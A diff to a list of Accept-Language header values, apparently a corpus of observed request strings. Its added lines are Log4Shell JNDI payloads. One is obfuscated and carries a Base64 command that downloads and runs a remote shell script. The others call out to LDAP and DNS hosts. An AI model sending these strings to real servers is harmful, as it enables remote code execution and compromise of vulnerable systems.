@@ -1,3 +1,5 @@
+${jndi:ldap://185.8.172.132:1389/a}
+${lower:j}${upper:n}${lower:d}${upper:i}:${rand:om:-l}${rand:om:-d}${rand:om:-a}${rand:om:-p}://198.9${::-8}.53.25:1389/TomcatBypass/Co${::-m}mand/Base${::-6}4/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}
 cn-CN,cn;q=0.5
 en
 en US,en;q=0.9,sv;q=0.8
@@ -45,3 +47,4 @@ zh-CN,zh;q=0.9,en;q=0.8,is;q=0.7,km;q=0.6,hmn;q=0.5,mn;q=0.4,ja;q=0.3
 zh-cn
 zh-cn,en-us;q=0.5
 zh_CN
+{jndi:dns://204-48-20-180.acceptlanguage.scanworld.net}
